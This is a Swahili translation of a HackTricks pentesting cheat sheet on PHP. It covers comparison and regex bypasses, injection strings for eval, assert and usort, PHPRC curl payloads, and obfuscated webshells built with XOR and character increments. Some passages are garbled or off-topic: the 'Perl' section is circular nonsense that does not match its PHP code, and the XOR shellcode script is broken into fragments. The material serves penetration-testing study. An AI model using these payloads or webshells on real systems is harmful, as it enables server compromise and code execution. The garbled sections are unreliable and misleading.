# Mbinu za PHP

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Mahali pa Kawaida pa Vidakuzi:

Hii pia inatumika kwa vidakuzi vya phpMyAdmin.

Vidakuzi:
```
PHPSESSID
phpMyAdmin
```
Maeneo:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Kuvuka Ulinganisho wa PHP

### Ulinganisho wa Kupunguza/Type Juggling ( == )

Ikiwa `==` inatumika katika PHP, basi kuna hali ambapo ulinganisho haifanyi kazi kama ilivyotarajiwa. Hii ni kwa sababu "==" inalinganisha tu thamani zilizobadilishwa kuwa aina ile ile, ikiwa unataka pia kulinganisha aina ya data inayolinganishwa ni sawa, unahitaji kutumia `===`.

Vitabu vya ulinganisho wa PHP: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> Kweli` Herufi ambayo haianzi na nambari ni sawa na nambari
* `"0xAAAA" == "43690" -> Kweli` Maneno yaliyoundwa na nambari katika muundo wa desimali au hexa yanaweza kulinganishwa na nambari/maneno mengine na matokeo ya Kweli ikiwa nambari hizo zilikuwa sawa (nambari katika herufi zinachukuliwa kama nambari)
* `"0e3264578" == 0 --> Kweli` Herufi inayoanza na "0e" na ikifuatiwa na chochote itakuwa sawa na 0
* `"0X3264578" == 0X --> Kweli` Herufi inayoanza na "0" na ikifuatiwa na herufi yoyote (X inaweza kuwa herufi yoyote) na ikifuatiwa na chochote itakuwa sawa na 0
* `"0e12334" == "0" --> Kweli` Hii ni ya kuvutia sana kwa sababu katika baadhi ya hali unaweza kudhibiti kuingiza herufi ya "0" na baadhi ya maudhui ambayo yanahashishwa na kulinganishwa nayo. Kwa hivyo, ikiwa unaweza kutoa thamani ambayo itaunda hash kuanzia na "0e" na bila herufi yoyote, unaweza kuvuka ulinganisho. Unaweza kupata **herufi zilizohashishwa tayari** na muundo huu hapa: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> Kweli` Herufi yoyote katika herufi ni sawa na nambari 0

Maelezo zaidi katika [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Type Juggling** pia inaathiri kazi ya `in_array()` kwa chaguo-msingi (unahitaji kuweka kweli hoja ya tatu ili kufanya ulinganisho wa kina).
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Ikiwa kazi hii inatumika kwa **uthibitisho wowote** (kama kuthibitisha nenosiri) na mtumiaji anadhibiti upande mmoja wa kulinganisha, anaweza kutuma safu tupu badala ya herufi kama thamani ya nenosiri (`https://example.com/login.php/?username=admin&password[]=`) na kuepuka uthibitisho huu:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Kosa lile lile linatokea na `strcasecmp()`

### Uchawi wa Aina ya Kukandamiza

Hata kama `===` inatumika, kuna makosa yanayofanya ulinganishaji uwe hatarini kwa uchawi wa aina. Kwa mfano, ikiwa ulinganishaji unabadilisha data kuwa aina tofauti ya kitu kabla ya kulinganisha:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** inaweza kutumika kwa **kuthibitisha kuingia kwa mtumiaji** (inachunguza ikiwa kuna neno/regex kutoka kwenye orodha nyeusi kwenye kuingia kwa mtumiaji na ikiwa hakuna, kificho kinaweza kuendelea na utekelezaji wake).

#### Kuepuka mstari mpya

Hata hivyo, wakati wa kubainisha mwanzo wa regexp, `preg_match()` **inachunguza tu mstari wa kwanza wa kuingia kwa mtumiaji**, kwa hivyo ikiwa kwa njia fulani unaweza **kupeleka** kuingia kwa mtumiaji kwa **mistari kadhaa**, unaweza kuepuka ukaguzi huu. Mfano:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Kuongeza njia hii unaweza **kutuma thamani na safu mpya zilizounganishwa na URL** (`%0A`) au ikiwa unaweza kutuma **data ya JSON**, ituma kwa **mistari kadhaa**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Pata mfano hapa: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Kosa la urefu kuvuka**

(Hii njia ya kuvuka ilijaribiwa kwenye PHP 5.2.5 na sikufanikiwa kuifanya kazi kwenye PHP 7.3.15)\
Ikiwa unaweza kutuma kwa `preg_match()` kuingia kubwa sana na **sahihi**, itashindwa kuiprocess na utaweza **kuvuka** ukaguzi. Kwa mfano, ikiwa inazuia JSON unaweza kutuma:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
Kutoka: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### Kupitisha Bypass

Hila kutoka: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)


<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Kwa ufupi tatizo linatokea kwa sababu `preg_*` kazi katika PHP inajengwa juu ya [maktaba ya PCRE](http://www.pcre.org/). Katika PCRE, mifano fulani ya kawaida inalinganishwa kwa kutumia wito nyingi za kurekursi, ambayo inatumia nafasi nyingi ya stack. Inawezekana kuweka kikomo kwa idadi ya kurekursi inayoruhusiwa, lakini katika PHP kikomo hiki [kinawekwa kwa 100,000 kwa chaguo-msingi](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) ambayo ni zaidi ya inavyolingana na stack.

[Thread hii ya Stackoverflow](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) pia ilikuwa imeunganishwa katika chapisho ambapo inazungumziwa zaidi kuhusu suala hili. Kazi yetu ilikuwa wazi sasa:\
**Tuma kuingia ambayo itafanya regex ifanye kurekursi zaidi ya 100,000, ikisababisha SIGSEGV, kufanya kazi ya `preg_match()` irudishe `false` hivyo kufanya programu iamini kuwa kuingia kwetu sio mbaya, kutupa mshangao mwishoni mwa mzigo kama `{system(<amri mbaya sana>)}` ili kupata SSTI --> RCE --> bendera :)**.

Vizuri, kwa maneno ya regex, hatufanyi kwa kweli "kurekursi" 100k, lakini badala yake tunahesabu "hatua za kurudi nyuma", ambazo kama [nyaraka za PHP](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) inasema inawekwa kwa 1,000,000 (1M) katika kipengele cha `pcre.backtrack_limit`.\
Kufikia hilo, `'X'*500_001` itatoa hatua za kurudi nyuma milioni moja (hatua 500k mbele na 500k nyuma):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Aina ya Juggling kwa ajili ya kuficha PHP

Type juggling ni mbinu ya kubadilisha aina ya data katika PHP ili kuficha au kuchanganya kanuni. Mbinu hii inaweza kutumika kwa kuficha kanuni ya PHP ili kufanya iwe ngumu kusoma au kuelewa.

Katika PHP, aina ya data inaweza kubadilishwa kwa kutumia opereta ya kulinganisha (==) badala ya opereta ya kulinganisha sawa (===). Hii inaruhusu kulinganisha kati ya aina tofauti za data, kama vile nambari na herufi, bila kuzingatia aina halisi ya data.

Kwa mfano, kulinganisha kati ya nambari 0 na herufi '0' kwa kutumia opereta ya kulinganisha (==) itatoa matokeo ya kweli, ingawa aina ya data ni tofauti. Hii inaweza kutumika kwa faida ya mshambuliaji kwa kuficha kanuni ya PHP.

Kwa kufanya juggling ya aina, mshambuliaji anaweza kuchanganya aina ya data ili kuficha kanuni halisi. Hii inaweza kufanyika kwa kubadilisha aina ya data ya pembejeo au kwa kubadilisha aina ya data ya matokeo ya kulinganisha.

Kwa mfano, kwa kutumia juggling ya aina, mshambuliaji anaweza kubadilisha aina ya data ya pembejeo kutoka herufi kwenda nambari ili kuficha kanuni halisi. Hii inaweza kufanyika kwa kutumia kazi kama vile `intval()` au `floatval()` ili kubadilisha herufi kuwa nambari.

Kwa kumalizia, type juggling ni mbinu ya kuficha kanuni ya PHP kwa kubadilisha aina ya data. Mbinu hii inaweza kutumika kwa faida ya mshambuliaji kwa kufanya kanuni iwe ngumu kusoma au kuelewa.
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Tekeleza Baada ya Kuelekeza (EAR)

Ikiwa PHP inaelekeza kwenye ukurasa mwingine lakini hakuna **`die`** au **`exit`** kazi inayoitwa baada ya kichwa cha **`Location`** kimewekwa, PHP inaendelea kutekeleza na kuongeza data kwenye mwili:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Mbinu zaidi

* **register\_globals**: Katika **PHP < 4.1.1.1** au ikiwa imepangwa vibaya, **register\_globals** inaweza kuwa active (au tabia yake inafanana). Hii inamaanisha kuwa katika mazingira ya kawaida kama vile $\_GET ikiwa na thamani kama $\_GET\["param"]="1234", unaweza kuipata kupitia **$param. Kwa hivyo, kwa kutuma vigezo vya HTTP unaweza kubadilisha thamani** ya variables ambazo hutumiwa ndani ya kificho.
* **PHPSESSION cookies za kikoa kimoja zimehifadhiwa mahali pamoja**, kwa hivyo ikiwa ndani ya kikoa **vidakuzi tofauti hutumiwa kwenye njia tofauti** unaweza kufanya njia moja **iweze kufikia kuki ya njia nyingine** kwa kuweka thamani ya kuki ya njia nyingine.\
Kwa njia hii, ikiwa **njia zote mbili zinafikia variable yenye jina sawa** unaweza kufanya **thamani ya variable hiyo katika njia ya kwanza itumike katika njia ya pili**. Na kisha njia ya pili itachukulia kama halali variables za njia ya kwanza (kwa kutoa kuki jina linalolingana nayo katika njia ya pili).
* Unapokuwa na **majina ya watumiaji** wa watumiaji wa mashine. Angalia anwani: **/\~\<USERNAME>** kuona ikiwa saraka za php zimeamilishwa.
* [**LFI na RCE kwa kutumia php wrappers**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Kazi hizi kawaida hutumiwa katika PHP ku **zalisha hash kutoka kwa nywila** na ku **angalia** ikiwa nywila ni sahihi ikilinganishwa na hash.\
Algoritimu zinazoungwa mkono ni: `PASSWORD_DEFAULT` na `PASSWORD_BCRYPT` (inaanza na `$2y$`). Tafadhali kumbuka kuwa **PASSWORD\_DEFAULT mara nyingi ni sawa na PASSWORD\_BCRYPT.** Na kwa sasa, **PASSWORD\_BCRYPT** ina **kikomo cha ukubwa katika kuingiza herufi 72**. Kwa hivyo, unapojaribu kuzalisha hash kwa kitu kikubwa kuliko herufi 72 kwa kutumia algoritimu hii, itatumika tu herufi 72 za kwanza:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Kuki za HTTP zinazokiuka kwa kutumia makosa ya PHP

Ikiwa **ukurasa wa PHP unachapisha makosa na kutoa tena baadhi ya pembejeo zinazotolewa na mtumiaji**, mtumiaji anaweza kufanya seva ya PHP ichapishe tena **maudhui marefu ya kutosha** ili wakati inajaribu **kuongeza vichwa vya habari** kwenye jibu, seva itatoa kosa.\
Katika mazingira yafuatayo, **mshambuliaji alifanya seva itoe makosa makubwa**, na kama unavyoona kwenye skrini wakati PHP ilijaribu **kubadilisha habari ya kichwa, haikuweza** (kwa hivyo kwa mfano kichwa cha CSP hakikutumwa kwa mtumiaji):

![](<../../../.gitbook/assets/image (465).png>)

## Utekelezaji wa Kanuni

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Angalia hii kwa kazi zaidi za kufaa za PHP](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Ili kutekeleza kificho katika hoja ya "badilisha" inahitajika angalau kulingana na moja.\
Chaguo hili la preg\_replace limepitwa na wakati tangu PHP 5.5.0.

### **RCE kupitia Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE kupitia Assert()**

Hii ni kazi ndani ya php inayokuwezesha **kutekeleza nambari iliyoundwa kwenye herufi** ili **irudishe ukweli au uwongo** (na kulingana na hii kubadilisha utekelezaji). Kawaida, kawaida ya mtumiaji itaingizwa katikati ya herufi. Kwa mfano:\
`assert("strpos($_GET['page']),'..') === false")` --> Katika kesi hii ili kupata **RCE** unaweza kufanya:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Utahitaji **kuvunja** muundo wa kanuni, **kuongeza** mzigo wako, na kisha **kurekebisha tena**. Unaweza kutumia **shughuli za mantiki** kama vile "**na" au "%26%26" au "|"**. Kumbuka kwamba "au", "||" haifanyi kazi kwa sababu ikiwa hali ya kwanza ni kweli mzigo wetu hautatekelezwa. Vile vile, ";" haifanyi kazi kwa sababu mzigo wetu hautatekelezwa.

**Chaguo lingine** ni kuongeza kwenye herufi utekelezaji wa amri: `'.highlight_file('.passwd').'`

**Chaguo lingine** (ikiwa una kanuni ya ndani) ni kubadilisha baadhi ya pembejeo ili kubadilisha utekelezaji: `$file = "hola"`

### **RCE kupitia usort()**

Kazi hii hutumiwa kusorti safu ya vitu kwa kutumia kazi maalum.\
Kwa kudanganya kazi hii:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Unaweza pia kutumia **//** kuweka maoni kwenye sehemu nyingine ya msimbo.

Ili kugundua idadi ya parenthesis unazohitaji kufunga:

* `?order=id;}//`: tunapata ujumbe wa kosa (`Parse error: syntax error, unexpected ';'`). Labda tunakosa parenthesis moja au zaidi.
* `?order=id);}//`: tunapata **onyo**. Inaonekana sawa.
* `?order=id));}//`: tunapata ujumbe wa kosa (`Parse error: syntax error, unexpected ')' i`). Labda tuna parenthesis nyingi za kufunga.

### **RCE kupitia .httaccess**

Ikiwa unaweza **kupakia** **.htaccess**, basi unaweza **kuweka mipangilio** kadhaa na hata kutekeleza msimbo (kwa kuweka faili hizo zenye kipengele cha .htaccess kuwa **zinatekelezwa**).

Makompyuta tofauti za .htaccess zinaweza kupatikana [hapa](https://github.com/wireghoul/htshells)

### RCE kupitia Mazingira ya Mazingira

Ikiwa unapata udhaifu ambao unakuwezesha **kurekebisha mazingira ya mazingira ya PHP** (na mwingine wa kupakia faili, ingawa kwa utafiti zaidi labda hii inaweza kuzuilika), unaweza kutumia tabia hii kwa kupata **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Kipengele hiki cha mazingira kinakuwezesha kupakia maktaba za aina yoyote unapotumia programu zingine (ingawa katika kesi hii inaweza isifanye kazi).
* **`PHPRC`** : Inaagiza PHP **mahali pa kupata faili yake ya usanidi**, kawaida inayoitwa `php.ini`. Ikiwa unaweza kupakia faili yako ya usanidi, basi tumia `PHPRC` kuielekeza PHP kwake. Ongeza kuingia la **`auto_prepend_file`** likiashiria faili ya pili iliyopakiwa. Faili hii ya pili ina **msimbo wa PHP wa kawaida, ambao kisha unatekelezwa** na muda wa PHP kabla ya msimbo mwingine wowote.
1. Pakia faili ya PHP inayojumuisha msimbo wetu wa kuingia
2. Pakia faili ya pili, ikiwa na maelekezo ya **`auto_prepend_file`** inayoagiza mchakato wa awali wa PHP kutekeleza faili tuliyopakia hatua ya 1
3. &#x20;Weka kipengele cha `PHPRC` kuwa faili tuliyopakia hatua ya 2.
* Pata habari zaidi juu ya jinsi ya kutekeleza mnyororo huu [**kutoka kwenye ripoti ya asili**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - chaguo lingine
* Ikiwa huwezi **kupakia faili**, unaweza kutumia kwenye FreeBSD "faili" `/dev/fd/0` ambayo ina **`stdin`**, ikiwa ni **mwili** wa ombi lililotumwa kwa `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Au ili kupata RCE, wezesha **`allow_url_include`** na ongeza faili na msimbo wa PHP wa **base64**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Mbinu [**kutoka kwenye ripoti hii**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## Uchambuzi Stahimilivu wa PHP

Angalia ikiwa unaweza kuweka msimbo katika wito wa kazi hizi (kutoka [hapa](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Ikiwa unafuatilia kosa katika programu ya PHP, unaweza kuwezesha uchapishaji wa makosa kwa kubadilisha faili ya `/etc/php5/apache2/php.ini` na kuongeza `display_errors = On`, kisha kuanzisha upya apache: `sudo systemctl restart apache2`

### Kufuta Obfuscating ya Msimbo wa PHP

Unaweza kutumia **mtandao**[ **www.unphp.net**](http://www.unphp.net) **kufuta obfuscating ya msimbo wa php.**

## PHP Wrappers & Protocols

PHP Wrappers na itifaki inaweza kukuruhusu **kuepuka ulinzi wa kuandika na kusoma** katika mfumo na kuathiri. Kwa [**mashauri zaidi angalia ukurasa huu**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug unauthenticated RCE

Ikiwa unaona kuwa **Xdebug** ime **wezeshwa** katika matokeo ya `phpconfig()`, jaribu kupata RCE kupitia [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Variable variables
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE kwa kutumia $\_GET\["a"]\($\_GET\["b"])

Ikiwa kwenye ukurasa unaweza **kuunda kitu kipya cha darasa lolote**, huenda ukaweza kupata RCE, angalia ukurasa ufuatao kujifunza jinsi:

{% content-ref url="php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Kutekeleza PHP bila herufi

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Kutumia octal
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (Exclusive OR) ni operesheni ya mantiki inayotumika katika uhandisi wa kompyuta na usalama wa habari. Operesheni hii inafanya kazi kwa kulinganisha bits mbili na kutoa matokeo ambayo ni kweli tu ikiwa bits hizo mbili ni tofauti. Katika XOR, ikiwa bits zote mbili ni sawa, matokeo yatakuwa uwongo.

Operesheni ya XOR ina matumizi mengi katika uwanja wa usalama wa habari. Moja ya matumizi yake ni kwa kuchanganya data ili kuficha habari muhimu. Kwa mfano, unaweza kutumia XOR kuchanganya nenosiri na data nyingine ili kuzalisha data iliyofichwa ambayo inaweza kuwa vigumu kuelewa au kubaini.

Kwa kuongezea, XOR inaweza kutumika katika kugundua na kurekebisha makosa katika uhamishaji wa data. Kwa kuchanganya data na XOR, unaweza kugundua ikiwa kuna makosa yoyote katika uhamishaji wa data kwa kulinganisha data iliyopokelewa na data iliyotumwa. Ikiwa kuna tofauti, inaweza kuashiria kuwa kuna makosa na unaweza kuchukua hatua za kurekebisha.

Kwa ujumla, XOR ni zana muhimu katika uwanja wa usalama wa habari na inaweza kutumika kwa njia mbalimbali za kuchanganya na kugundua makosa katika data.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¬¢___ not needed then $_($__), show_source(.passwd)
```
### XOR kificho rahisi wa shell

Kulingana na [**hii maelezo**](https://mgp25.com/ctf/Web-challenge/), inawezekana kuzalisha kificho rahisi wa shell kwa njia ifuatayo:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Hivyo, ikiwa unaweza **kutekeleza PHP yoyote bila kutumia nambari na herufi**, unaweza kutuma ombi kama ifuatavyo kwa kutumia mzigo huo kutekeleza PHP yoyote:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Kwa maelezo zaidi angalia [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (ndani ya eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Kama Perl

Perl ni lugha ya programu ambayo inaweza kutumika kwa maendeleo ya wavuti. Ina syntax inayofanana na Perl na inaweza kutumika kwa kuchambua na kusindika data kwenye wavuti.

Kwa mfano, unaweza kutumia Perl kufanya mambo kama vile kuchanganua data iliyopokelewa kutoka kwa fomu ya wavuti, kufanya mabadiliko kwenye faili za wavuti, au kufanya mawasiliano na seva za mbali.

Kwa kuwa Perl ina syntax inayofanana na Perl, watumiaji wa Perl wanaweza kuhisi vizuri wanapotumia Perl kwa maendeleo ya wavuti. Hii inaweza kuwa na faida kwa watumiaji ambao tayari wana uzoefu na Perl na wanataka kuchanganya ujuzi wao wa Perl na maendeleo ya wavuti.

Kwa kumalizia, Perl inaweza kuwa chaguo nzuri kwa watumiaji ambao wanapenda syntax ya Perl na wanataka kutumia lugha hiyo kwa maendeleo ya wavuti.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
